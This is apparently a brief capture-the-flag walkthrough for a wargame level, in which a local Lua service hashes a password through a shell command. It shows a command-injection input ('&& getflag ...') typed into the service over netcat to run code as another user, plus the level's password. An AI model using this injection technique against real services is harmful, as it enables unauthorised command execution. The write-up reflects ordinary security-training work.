## Step 1
> ls -l ~

There was one file ``level11.lua``.

## Step 2
> cat level11.lua

We saw in it that it was running on ``127.0.0.1:5151`` and was waiting for a password, before hashing it with ``echo [something] | sha1sum``.

## Step 3
> nc 127.0.0.1 5151

> && getflag /tmp/flag

> cat /tmp/flag

The flag was displayed in the file, because it was executed in bash with user ``flag11``, as we were able to see at [Step 1](#step-1).

## Bonus
The "good password" waiting for the hash is ``-n NotSoEasy``.
